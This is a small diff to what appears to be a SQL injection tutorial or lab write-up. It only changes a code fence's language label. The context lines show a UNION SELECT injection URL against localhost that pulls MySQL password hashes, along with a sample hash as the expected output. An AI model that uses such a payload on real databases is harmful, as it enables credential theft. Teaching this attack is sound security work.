@@ -29,7 +29,7 @@ http://localhost:8080/p/2 UNION SELECT 1,(SELECT authentication_string FROM mysq
 
 
 The result will be something like this: 
-```javascript
+```shell
 *14594DCDEA27F5322936D6F1143F8C4F3B8F5A3E
 ```
 
